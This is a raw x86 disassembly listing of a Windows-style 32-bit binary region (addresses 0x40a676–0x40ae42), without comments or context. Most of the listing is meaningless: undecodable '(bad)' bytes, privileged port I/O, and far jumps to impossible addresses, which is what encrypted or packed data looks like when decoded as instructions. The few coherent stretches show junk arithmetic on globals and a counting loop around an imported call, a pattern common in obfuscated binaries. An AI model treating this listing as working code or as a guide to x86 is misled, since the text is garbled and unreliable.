  40a676:	shl    DWORD PTR [ebp+edx*1+0x74],0x6c
  40a67b:	cmp    DWORD PTR [ebx-0xe],ecx
  40a67e:	or     DWORD PTR [edx],edi
  40a680:	xchg   ebx,eax
  40a681:	push   0x9b5eb9ab
  40a686:	out    0xc7,al
  40a688:	sbb    ch,BYTE PTR [eax]
  40a68a:	add    bl,BYTE PTR [ebp+0x28]
  40a68d:	imul   ecx,DWORD PTR [ebx+ebp*4+0x66da9ce9],0xfffffff1
  40a695:	call   0xf7817322
  40a69a:	arpl   sp,sp
  40a69c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a69d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a69e:	xchg   ebx,eax
  40a69f:	mov    ebp,0x4c57b6b8
  40a6a4:	out    0x8a,al
  40a6a6:	call   0x1ad3:0x3ebf3d6b
  40a6ad:	pop    eax
  40a6ae:	mov    bh,0xbe
  40a6b0:	ret    
  40a6b1:	pusha  
  40a6b2:	daa    
  40a6b3:	pusha  
  40a6b4:	cmp    al,ch
  40a6b6:	mov    ebx,0x1f09c23a
  40a6bb:	in     al,dx
  40a6bc:	mov    eax,ebp
  40a6be:	pop    ds
  40a6bf:	stos   DWORD PTR es:[edi],eax
  40a6c0:	xor    dh,BYTE PTR [esi]
  40a6c2:	and    eax,0xffffffb1
  40a6c5:	push   ds
  40a6c6:	ret    0xe2d8
  40a6c9:	popa   
  40a6ca:	pop    ds
  40a6cb:	adc    DWORD PTR [ecx-0x36166cdd],0xaf12843f
  40a6d5:	push   ebx
  40a6d6:	xchg   ebp,eax
  40a6d7:	xor    BYTE PTR [eax-0x2341b353],bh
  40a6dd:	inc    edx
  40a6de:	xchg   edx,eax
  40a6df:	and    DWORD PTR [esp+ecx*2],eax
  40a6e2:	pop    ss
  40a6e3:	mov    dl,0xb4
  40a6e5:	adc    al,0xc9
  40a6e7:	repnz enter 0x5716,0x20
  40a6ec:	sbb    eax,0x5c7f83b
  40a6f1:	imul   esi,DWORD PTR [esi],0x43
  40a6f4:	add    BYTE PTR [eax+0xf00005a],ch
  40a6fa:	test   edi,esp
  40a6fc:	or     eax,0x15810000
  40a701:	push   edi
  40a702:	ss inc ebx
  40a704:	add    dl,bh
  40a706:	or     eax,DWORD PTR [eax]
  40a708:	add    bh,bh
  40a70a:	jne    0x40a714
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xd090ec0c
  40a7ac:	(bad)  
  40a7ad:	lods   al,BYTE PTR ds:[esi]
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	out    0x99,al
  40a7b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7b9:	test   BYTE PTR [edi-0x23],bl
  40a7bc:	push   ecx
  40a7bd:	or     eax,0x6003dae3
  40a7c2:	gs mov al,0x71
  40a7c5:	sbb    dh,BYTE PTR [edx-0x1c]
  40a7c8:	lahf   
  40a7c9:	pop    esp
  40a7ca:	das    
  40a7cb:	push   edi
  40a7cc:	add    edi,DWORD PTR [eax+ecx*8]
  40a7cf:	xchg   DWORD PTR [esi-0x7e782b38],esi
  40a7d5:	in     al,dx
  40a7d6:	push   esi
  40a7d7:	shl    DWORD PTR [eax],cl
  40a7d9:	out    dx,al
  40a7da:	adc    BYTE PTR [eax],ch
  40a7dc:	push   ebx
  40a7dd:	jns    0x40a794
  40a7df:	push   0xa31cd60f
  40a7e4:	mov    dl,dl
  40a7e6:	pusha  
  40a7e7:	test   eax,0x872a0a51
  40a7ec:	xor    eax,0x9f2de18e
  40a7f1:	scas   eax,DWORD PTR es:[edi]
  40a7f2:	retf   
  40a7f3:	mov    ebp,0x11176891
  40a7f8:	add    DWORD PTR [edi+0x49],esi
  40a7fb:	and    al,0x81
  40a7fd:	aaa    
  40a7fe:	in     eax,0x20
  40a800:	ins    BYTE PTR es:[edi],dx
  40a801:	jbe    0x40a848
  40a803:	inc    ebp
  40a804:	xor    al,0xf6
  40a806:	dec    edi
  40a807:	rol    BYTE PTR [edi],1
  40a809:	or     eax,0x99908b55
  40a80e:	inc    edi
  40a80f:	push   ss
  40a810:	scas   al,BYTE PTR es:[edi]
  40a811:	xchg   ebp,eax
  40a812:	mov    ebx,0x3a26d574
  40a817:	inc    edx
  40a818:	arpl   WORD PTR [esi-0x763b3ad4],di
  40a81e:	mul    dh
  40a820:	sub    DWORD PTR [ecx-0x4e8907c3],eax
  40a826:	fwait
  40a827:	cwde   
  40a828:	scas   al,BYTE PTR es:[edi]
  40a829:	inc    ecx
  40a82a:	or     BYTE PTR ds:0xc53a89bd,cl
  40a830:	in     eax,0x8d
  40a832:	out    0xbc,al
  40a834:	push   ecx
  40a835:	xor    BYTE PTR [eax],al
  40a837:	push   ss
  40a838:	xchg   ebx,eax
  40a839:	in     al,dx
  40a83a:	mov    ds:0xe5eaaad2,eax
  40a83f:	sahf   
  40a840:	lea    edx,[eax-0xb]
  40a843:	test   eax,0xe90e202e
  40a848:	mov    cl,0x20
  40a84a:	dec    ebx
  40a84b:	sub    bl,bh
  40a84d:	and    al,0x0
  40a84f:	cwde   
  40a850:	cdq    
  40a851:	adc    esi,DWORD PTR ds:[ebx*2+0x61567fbb]
  40a859:	jecxz  0x40a866
  40a85b:	inc    ecx
  40a85c:	xchg   ebp,eax
  40a85d:	fchs   
  40a85f:	outs   dx,DWORD PTR ds:[esi]
  40a860:	mov    ebx,0x885ed0ec
  40a865:	out    0x3a,al
  40a867:	scas   al,BYTE PTR es:[edi]
  40a868:	mov    bl,0x77
  40a86a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a86b:	(bad)
  40a86f:	cmp    al,BYTE PTR [eax+ecx*4]
  40a872:	inc    ecx
  40a873:	sbb    BYTE PTR [edi+0x4d],cl
  40a876:	adc    BYTE PTR [edx-0x53],0xf7
  40a87a:	fisub  WORD PTR [edx]
  40a87c:	(bad)  
  40a87d:	in     al,dx
  40a87e:	push   esp
  40a87f:	pop    ebp
  40a880:	mov    esi,0xf9cb771a
  40a885:	add    BYTE PTR [ecx+eiz*4],dl
  40a888:	xchg   ch,al
  40a88a:	mov    esp,0x51c629a8
  40a88f:	stos   DWORD PTR es:[edi],eax
  40a890:	push   es
  40a891:	mov    ebp,0x683658f7
  40a896:	mov    ebx,0x10512eb7
  40a89b:	sbb    al,0x8b
  40a89d:	loop   0x40a914
  40a89f:	ret    
  40a8a0:	xchg   bl,dl
  40a8a2:	les    edx,FWORD PTR [esi]
  40a8a4:	pop    eax
  40a8a5:	clc    
  40a8a6:	or     al,0x7a
  40a8a8:	popf   
  40a8a9:	shl    al,1
  40a8ab:	aad    0xed
  40a8ad:	popa   
  40a8ae:	sub    DWORD PTR [edi],0xde903dc1
  40a8b4:	add    eax,0x45e1b59c
  40a8b9:	fwait
  40a8ba:	mov    dl,0xe0
  40a8bc:	xor    al,0x27
  40a8be:	xor    cl,BYTE PTR [eax-0x1a]
  40a8c1:	mov    ebx,eax
  40a8c3:	scas   eax,DWORD PTR es:[edi]
  40a8c4:	in     eax,dx
  40a8c5:	sbb    DWORD PTR [edi+0x77],eax
  40a8c8:	push   ebp
  40a8c9:	icebp  
  40a8ca:	dec    ebx
  40a8cb:	lods   al,BYTE PTR ds:[esi]
  40a8cc:	and    dh,BYTE PTR [ebx+ebx*8+0x49]
  40a8d0:	lea    esi,[esi]
  40a8d2:	xchg   esp,eax
  40a8d3:	mov    dl,0x2a
  40a8d5:	adc    eax,0xc10220da
  40a8da:	jmp    0x40a8b4
  40a8dc:	pop    ebx
  40a8dd:	and    al,0xde
  40a8df:	push   0x66
  40a8e1:	sar    bl,1
  40a8e3:	pusha  
  40a8e4:	test   eax,0xbabbc23f
  40a8e9:	xlat   BYTE PTR ds:[ebx]
  40a8ea:	(bad)  
  40a8eb:	inc    edi
  40a8ec:	pop    ebp
  40a8ed:	sub    ecx,DWORD PTR [ebp-0x3b92bbd8]
  40a8f3:	pop    ebx
  40a8f4:	ss (bad) 
  40a8f6:	in     al,dx
  40a8f7:	mov    dl,0xaa
  40a8f9:	(bad)  
  40a8fa:	rcl    esp,cl
  40a8fc:	pushf  
  40a8fd:	outs   dx,BYTE PTR ds:[esi]
  40a8fe:	test   BYTE PTR [ebx-0x30],cl
  40a901:	rcl    BYTE PTR [esi],cl
  40a903:	cld    
  40a904:	imul   eax,DWORD PTR [esi+0x33f9e883],0x3a298997
  40a90e:	out    0xf3,eax
  40a910:	dec    ebx
  40a911:	ss cmp eax,0x9271dc9e
  40a917:	lds    esi,FWORD PTR [ebp+0x4f11e36c]
  40a91d:	jae    0x40a98a
  40a91f:	sub    bh,0x19
  40a922:	xchg   ecx,eax
  40a923:	sbb    DWORD PTR [edx],edi
  40a925:	mov    ds:0xa3d7e9bc,eax
  40a92a:	arpl   WORD PTR [ebx],cx
  40a92c:	xchg   ebx,eax
  40a92d:	loope  0x40a8b9
  40a92f:	xor    ecx,DWORD PTR [eax-0x4fc0316d]
  40a935:	ret    0x7280
  40a938:	pop    esp
  40a939:	(bad)  
  40a93a:	pop    edi
  40a93b:	mov    ecx,0xa1a25810
  40a940:	inc    esp
  40a941:	xor    DWORD PTR [edx],edx
  40a943:	stos   DWORD PTR es:[edi],eax
  40a944:	mov    ds:0xe9e41ad8,eax
  40a949:	jmp    0xc487:0xad157c96
  40a950:	cs (bad) 
  40a952:	nop
  40a953:	dec    ebp
  40a954:	adc    bh,BYTE PTR [esi+0x559270a3]
  40a95a:	dec    esi
  40a95b:	push   es
  40a95c:	and    edx,esi
  40a95e:	loop   0x40a952
  40a960:	and    bl,BYTE PTR [edi]
  40a962:	xchg   BYTE PTR [ebx+0xb],ch
  40a965:	dec    ebp
  40a966:	sahf   
  40a967:	call   0xffeb:0x3b740df2
  40a96e:	sub    al,0x6a
  40a970:	in     eax,0x3e
  40a972:	xor    cl,bh
  40a974:	retf   
  40a975:	in     eax,0x97
  40a977:	fld    st(5)
  40a979:	inc    esi
  40a97a:	mov    esi,DWORD PTR [eax+0x7af6cff4]
  40a980:	xchg   esi,edx
  40a982:	pusha  
  40a983:	adc    al,BYTE PTR [edx]
  40a985:	mov    bh,0xfb
  40a987:	test   BYTE PTR [edi-0x44d1f8af],cl
  40a98d:	lahf   
  40a98e:	adc    DWORD PTR [ecx],ebx
  40a990:	cmp    al,bh
  40a992:	mov    bh,0xbd
  40a994:	push   cs
  40a995:	mov    cs,WORD PTR [esi+0x76decede]
  40a99b:	loopne 0x40aa14
  40a99d:	sbb    DWORD PTR [esi],esi
  40a99f:	ret    
  40a9a0:	outs   dx,DWORD PTR ds:[esi]
  40a9a1:	ins    DWORD PTR es:[edi],dx
  40a9a2:	jbe    0x40aa01
  40a9a4:	rcl    BYTE PTR [eax],cl
  40a9a6:	js     0x40a964
  40a9a8:	mov    eax,ds:0x681f9e3d
  40a9ad:	(bad)  
  40a9ae:	test   al,0x5a
  40a9b0:	fild   WORD PTR ds:0x6dc5a872
  40a9b6:	aam    0xf9
  40a9b8:	ins    DWORD PTR es:[edi],dx
  40a9b9:	stos   DWORD PTR es:[edi],eax
  40a9ba:	cmp    BYTE PTR [ecx-0x80],0x35
  40a9be:	jo     0x40a9f0
  40a9c0:	jmp    0x511d27d2
  40a9c5:	pop    ss
  40a9c6:	outs   dx,DWORD PTR ds:[esi]
  40a9c7:	dec    esi
  40a9c8:	fsubp  st(5),st
  40a9ca:	fsubr  DWORD PTR [esp+eax*8-0x27]
  40a9ce:	fs jb  0x40a97f
  40a9d1:	jp     0x40a991
  40a9d3:	and    al,0x32
  40a9d5:	pop    ebx
  40a9d6:	push   esp
  40a9d7:	gs xor ecx,ebx
  40a9da:	dec    edx
  40a9db:	and    BYTE PTR cs:[ebx],bh
  40a9de:	mov    bl,0xd2
  40a9e0:	repnz dec edx
  40a9e2:	pop    eax
  40a9e3:	cwde   
  40a9e4:	pop    esp
  40a9e5:	jp     0x40a991
  40a9e7:	add    BYTE PTR [edi+0x49],dh
  40a9ea:	push   esp
  40a9eb:	stos   DWORD PTR es:[edi],eax
  40a9ec:	out    dx,eax
  40a9ed:	add    al,0xe8
  40a9f0:	sbb    al,0x4a
  40a9f2:	das    
  40a9f3:	nop
  40a9f4:	dec    ebx
  40a9f5:	mov    bh,0xaa
  40a9f7:	ror    BYTE PTR [esi-0x76452d96],0x45
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	cmp    dh,BYTE PTR [eax-0x142fc896]
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	jo     0x40aab5
  40aa42:	(bad)  [ecx+0x1516a45]
  40aa48:	cmp    al,0x7d
  40aa4a:	cmc    
  40aa4b:	lahf   
  40aa4c:	mov    ecx,0xf848637f
  40aa51:	ja     0x40aa61
  40aa53:	pop    ebx
  40aa54:	(bad)  
  40aa55:	arpl   bp,bp
  40aa57:	mov    bh,BYTE PTR [eax+0x6f5840af]
  40aa5d:	xchg   esp,eax
  40aa5e:	cmp    dh,BYTE PTR [ebx+0x4441ac44]
  40aa64:	pop    ebp
  40aa65:	jo     0x40a9ee
  40aa67:	in     eax,dx
  40aa68:	(bad)  
  40aa6a:	jo     0x40aae0
  40aa6c:	rcr    BYTE PTR [ebx+0xf],cl
  40aa6f:	jp     0x40aadf
  40aa71:	retf   0x974b
  40aa74:	mov    eax,ds:0xd7f025a4
  40aa79:	xor    al,0x5
  40aa7b:	cmp    edi,DWORD PTR [ecx]
  40aa7d:	sbb    esp,DWORD PTR [esp+ebp*2+0x59d5551f]
  40aa84:	and    BYTE PTR [edi+ebp*2+0x19c3bdf5],ah
  40aa8b:	cmp    al,0x9f
  40aa8d:	mov    esi,0xbf2f05f5
  40aa92:	or     eax,0x693c3643
  40aa97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa98:	(bad)  
  40aa99:	out    0x69,eax
  40aa9b:	or     edi,DWORD PTR [eax-0x2526adbc]
  40aaa1:	sar    DWORD PTR [edx-0x7a],1
  40aaa4:	push   es
  40aaa5:	jbe    0x40aa2f
  40aaa7:	xchg   ebp,eax
  40aaa8:	cmp    ecx,DWORD PTR [eax+0x42]
  40aaab:	js     0x40aafa
  40aaad:	jns    0x40aad7
  40aaaf:	outs   dx,DWORD PTR ds:[esi]
  40aab0:	ret    
  40aab1:	call   0x876:0x2fb79831
  40aab8:	test   eax,0xf437c574
  40aabd:	xchg   esp,eax
  40aabe:	(bad)  
  40aabf:	hlt    
  40aac0:	mov    bl,0x10
  40aac2:	int    0x6d
  40aac4:	and    eax,0x9af1c101
  40aac9:	adc    DWORD PTR [eax],ebp
  40aacb:	mov    dh,0x6e
  40aacd:	push   0x4868cae5
  40aad2:	ja     0x40aa6a
  40aad4:	ss call 0xae5c:0xa48ede52
  40aadc:	add    bl,0x5d
  40aadf:	mov    edx,0x9116cb9d
  40aae4:	push   edx
  40aae5:	dec    esi
  40aae6:	xchg   esi,eax
  40aae7:	jne    0x40ab0c
  40aae9:	add    ch,BYTE PTR [edx]
  40aaeb:	or     al,0x59
  40aaed:	push   ds
  40aaee:	test   esp,esp
  40aaf0:	repnz stc 
  40aaf2:	and    eax,0xbfa18c02
  40aaf7:	sbb    BYTE PTR [eax],ah
  40aaf9:	lock sar DWORD PTR [edi+0x6a5de73c],0x18
  40ab01:	retf   0xcbb2
  40ab04:	daa    
  40ab05:	outs   dx,BYTE PTR ds:[esi]
  40ab06:	fstp   DWORD PTR [ebx+0x3a93460b]
  40ab0c:	jmp    DWORD PTR [esp+esi*4+0x0]
  40ab10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab11:	sbb    ebx,0x7cb6c7f
  40ab17:	cs inc edi
  40ab19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab1a:	sub    edi,DWORD PTR [edx]
  40ab1c:	xor    al,0xdf
  40ab1e:	push   ds
  40ab1f:	cmp    al,0x3a
  40ab21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab22:	xchg   ebx,eax
  40ab23:	jle    0x40ab10
  40ab25:	scas   al,BYTE PTR es:[edi]
  40ab26:	and    ah,dh
  40ab28:	js     0x40aac3
  40ab2a:	inc    esi
  40ab2b:	fbstp  TBYTE PTR [ebp+0x450505fb]
  40ab31:	mov    ch,0x18
  40ab33:	mov    al,ds:0x50d9908d
  40ab38:	adc    BYTE PTR [ecx+0x70dcfbae],bl
  40ab3e:	and    BYTE PTR [eax-0x7e],ch
  40ab41:	(bad)  
  40ab43:	(bad)  
  40ab45:	imul   DWORD PTR [ecx+0x7d01ba51]
  40ab4b:	add    edi,ebx
  40ab4d:	cmp    al,0xfc
  40ab4f:	xor    al,BYTE PTR [esi]
  40ab51:	in     al,0xea
  40ab53:	mov    edx,0xee4ee838
  40ab58:	and    eax,0x24c247ee
  40ab5d:	je     0x40ab1c
  40ab5f:	jns    0x40ab71
  40ab61:	(bad)  
  40ab62:	mov    al,ss:0x9eadba8d
  40ab68:	stos   DWORD PTR es:[edi],eax
  40ab69:	outs   dx,DWORD PTR ds:[esi]
  40ab6a:	ins    BYTE PTR es:[edi],dx
  40ab6b:	mov    ecx,0x5cc07108
  40ab70:	sbb    al,0xc9
  40ab72:	mov    edx,0x8a6e9117
  40ab77:	cwde   
  40ab78:	sub    edx,DWORD PTR ds:0x4a8f20db
  40ab7e:	shl    bh,0xfc
  40ab81:	mov    edx,0x81740d7f
  40ab86:	xchg   esi,eax
  40ab87:	cmp    eax,0x9c420caa
  40ab8c:	fidiv  WORD PTR [eax+0x3fe909a4]
  40ab92:	push   edx
  40ab93:	je     0x40abca
  40ab95:	or     esi,ecx
  40ab97:	sbb    dh,dl
  40ab99:	and    al,0x60
  40ab9b:	aad    0xc6
  40ab9d:	aas    
  40ab9e:	in     ax,0x40
  40aba1:	gs cli 
  40aba3:	mov    ebx,0xa91f2ab7
  40aba8:	push   cs
  40aba9:	in     al,0x65
  40abab:	inc    ebp
  40abac:	loope  0x40ab8e
  40abae:	data16 into 
  40abb0:	xchg   edi,eax
  40abb1:	dec    esi
  40abb2:	lods   eax,DWORD PTR ds:[esi]
  40abb3:	stc    
  40abb4:	(bad)  [esi+ebp*4]
  40abb7:	cmp    ecx,DWORD PTR [ecx-0x80]
  40abba:	jae    0x40ab92
  40abbc:	gs sahf 
  40abbe:	stos   BYTE PTR es:[edi],al
  40abbf:	in     al,dx
  40abc0:	ds js  0x40ac2f
  40abc3:	cmc    
  40abc4:	or     dl,cl
  40abc6:	pop    ss
  40abc7:	ja     0x40ab97
  40abc9:	mov    cl,0xc6
  40abcb:	fwait
  40abcc:	mov    eax,0xc4564a4c
  40abd1:	dec    ebp
  40abd2:	cmp    DWORD PTR [ebp+0x4e],esi
  40abd5:	jnp    0x40ab6b
  40abd7:	loopne 0x40ab7b
  40abd9:	dec    ebx
  40abda:	adc    DWORD PTR [esi],esp
  40abdc:	or     bl,al
  40abde:	dec    edx
  40abdf:	mov    al,0xb6
  40abe1:	lds    ebx,FWORD PTR [ecx+0x1a8dacd4]
  40abe7:	push   ds
  40abe8:	or     DWORD PTR [ebp+0x71b3bd69],esi
  40abee:	cli    
  40abef:	mov    bl,0xcb
  40abf1:	leave  
  40abf2:	out    dx,eax
  40abf3:	popa   
  40abf4:	jl     0x40ab9d
  40abf6:	cld    
  40abf7:	mov    al,0x9d
  40abf9:	setae  BYTE PTR [edx+0x67]
  40abfd:	std    
  40abfe:	xor    esi,ebx
  40ac00:	sti    
  40ac01:	out    dx,al
  40ac02:	or     BYTE PTR [ebx-0x13],ah
  40ac05:	test   eax,0xe8df9050
  40ac0a:	loopne 0x40ab8d
  40ac0c:	push   edi
  40ac0d:	push   0xca00a08b
  40ac12:	mov    WORD PTR [esi],cs
  40ac14:	fistp  WORD PTR [ebx-0x43b03227]
  40ac1a:	mov    ch,0x55
  40ac1c:	xchg   ecx,eax
  40ac1d:	sbb    eax,0x68458bd0
  40ac22:	or     ebx,DWORD PTR [edi-0x50918af3]
  40ac28:	dec    ecx
  40ac29:	adc    ch,BYTE PTR [ebx+eiz*2-0x694db2fc]
  40ac30:	inc    ecx
  40ac31:	pop    esi
  40ac32:	into   
  40ac33:	pop    ecx
  40ac34:	sub    esi,DWORD PTR [ecx+ebx*1-0x1f51ea56]
  40ac3b:	test   DWORD PTR [eax-0x64c1cb9c],esp
  40ac41:	ret    
  40ac42:	imul   ebp,DWORD PTR [edi+0x66],0x4b
  40ac46:	lea    ecx,[eax]
  40ac48:	xchg   bl,ch
  40ac4a:	pop    ebx
  40ac4b:	icebp  
  40ac4c:	adc    DWORD PTR [ebp-0x71],ecx
  40ac4f:	push   esp
  40ac50:	or     eax,0x1adbddfa
  40ac55:	pop    esp
  40ac56:	daa    
  40ac57:	xchg   esp,eax
  40ac58:	push   esp
  40ac59:	clc    
  40ac5a:	cld    
  40ac5b:	sbb    DWORD PTR [edi],esi
  40ac5d:	outs   dx,DWORD PTR ds:[esi]
  40ac5e:	fstp   QWORD PTR [ebp+0x187720e5]
  40ac64:	cmp    ah,BYTE PTR [edx+0x314c6828]
  40ac6a:	xabort 0x1e
  40ac6d:	adc    dl,BYTE PTR [esi+0x26]
  40ac70:	inc    ecx
  40ac71:	adc    ah,BYTE PTR [edi+edx*1]
  40ac74:	shl    DWORD PTR [edx],1
  40ac76:	mov    bl,0x56
  40ac78:	mov    al,ds:0x2fca864e
  40ac7d:	ins    DWORD PTR es:[edi],dx
  40ac7e:	mov    bl,0x23
  40ac80:	mov    BYTE PTR [edi+0xcdff732],ah
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x43366b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4336ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x724dddb],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad16
  40ad2c:	test   BYTE PTR [edx-0x64],ch
  40ad2f:	ds mov esi,0x978485c1
  40ad35:	xchg   esi,eax
  40ad36:	and    ecx,DWORD PTR [eax+0xb]
  40ad39:	mov    esp,ecx
  40ad3b:	pop    ebp
  40ad3c:	xchg   ebx,eax
  40ad3d:	fild   DWORD PTR [edi+0x50]
  40ad40:	xchg   edx,eax
  40ad41:	push   ss
  40ad42:	jg     0x40ad49
  40ad44:	jmp    0x29ca54a4
  40ad49:	mov    cl,0x1b
  40ad4b:	repz jne 0x40ad16
  40ad4e:	scas   al,BYTE PTR es:[edi]
  40ad4f:	scas   al,BYTE PTR es:[edi]
  40ad50:	pop    edx
  40ad51:	push   ebp
  40ad52:	(bad)  
  40ad53:	in     eax,dx
  40ad54:	inc    edi
  40ad55:	ss push edi
  40ad57:	mov    al,cs:0x560d7e69
  40ad5d:	push   ds
  40ad5e:	jns    0x40adc5
  40ad60:	imul   ecx,esi,0x9e1c243e
  40ad66:	sti    
  40ad67:	out    0xe,al
  40ad69:	pop    esp
  40ad6a:	xchg   esp,eax
  40ad6b:	leave  
  40ad6c:	push   ebp
  40ad6d:	pop    ebx
  40ad6e:	xchg   ebp,eax
  40ad6f:	cdq    
  40ad70:	dec    eax
  40ad71:	ds jne 0x40ad4b
  40ad74:	cmc    
  40ad75:	mov    al,ds:0xa5d64e27
  40ad7a:	jo     0x40adea
  40ad7c:	repnz mov ds:0xbd76a043,eax
  40ad82:	inc    ebx
  40ad83:	xchg   DWORD PTR [edx-0xd],ebp
  40ad86:	pop    edx
  40ad87:	mov    ebp,0x8a589f94
  40ad8c:	inc    esi
  40ad8d:	bound  esi,QWORD PTR [ebx-0x7e6b60db]
  40ad93:	jno    0x40ad73
  40ad95:	jecxz  0x40adb8
  40ad97:	sbb    eax,0x8b213af1
  40ad9c:	sub    BYTE PTR [esi-0x1938ad75],ch
  40ada2:	xchg   BYTE PTR ds:0x66697d18,cl
  40ada8:	int3   
  40ada9:	retf   0x4ce7
  40adac:	sub    BYTE PTR [edi+0x52],bl
  40adaf:	dec    DWORD PTR [eax-0x35028d2f]
  40adb5:	pop    esi
  40adb6:	xchg   ebx,eax
  40adb7:	retf   0x5332
  40adba:	inc    ebp
  40adbb:	xchg   BYTE PTR [ecx],al
  40adbd:	gs jl  0x40ade9
  40adc0:	popa   
  40adc1:	ret    
  40adc2:	mov    esp,0x19388579
  40adc7:	in     al,0xc6
  40adc9:	sub    al,cl
  40adcb:	pop    ebp
  40adcc:	sbb    DWORD PTR [ebx-0x2d],ebx
  40adcf:	xor    cl,ch
  40add1:	(bad)  
  40add2:	arpl   WORD PTR cs:[eax],bx
  40add5:	(bad)  
  40add7:	or     DWORD PTR [ecx],ebx
  40add9:	mov    bl,0xc8
  40addb:	adc    eax,0x26b3acc6
  40ade0:	(bad)  
  40ade1:	jecxz  0x40ad9e
  40ade3:	das    
  40ade4:	bound  eax,QWORD PTR [edi]
  40ade6:	xchg   ebx,eax
  40ade7:	push   ebx
  40ade8:	lods   eax,DWORD PTR ds:[esi]
  40ade9:	inc    esi
  40adea:	das    
  40adeb:	sbb    DWORD PTR [esi],ecx
  40aded:	(bad)  
  40adee:	xor    bl,al
  40adf0:	xor    al,0xa6
  40adf2:	inc    ebp
  40adf3:	cwde   
  40adf4:	int    0xfb
  40adf6:	jae    0x40ae73
  40adf8:	dec    eax
  40adf9:	fnsave [eax]
  40adfb:	aaa    
  40adfc:	xchg   ecx,eax
  40adfd:	leave  
  40adfe:	xchg   esi,eax
  40adff:	in     al,dx
  40ae00:	push   edi
  40ae01:	mov    ebx,0xfe792cb6
  40ae06:	mov    ebp,0x9b95a991
  40ae0b:	xor    edi,DWORD PTR [edi-0x60abed8b]
  40ae11:	jo     0x40ae24
  40ae13:	or     esi,DWORD PTR [esi+0x5fac3a0b]
  40ae19:	and    cl,BYTE PTR [esi]
  40ae1b:	rcr    BYTE PTR [edx],cl
  40ae1d:	mov    DWORD PTR [esi-0x43],edi
  40ae20:	dec    ecx
  40ae21:	mov    dh,0x8b
  40ae23:	pusha  
  40ae24:	inc    ebx
  40ae25:	sub    eax,0xcd61f47f
  40ae2a:	sub    eax,0x263fbdae
  40ae2f:	pop    ebp
  40ae30:	dec    edx
  40ae31:	add    ch,BYTE PTR [ecx]
  40ae33:	mov    ah,0xd0
  40ae35:	mov    al,ds:0xef12c837
  40ae3a:	addr16 sub al,0xdf
  40ae3d:	cmp    al,0x34
  40ae3f:	sub    BYTE PTR [ecx],bl
  40ae41:	iret   
  40ae42:	ret    
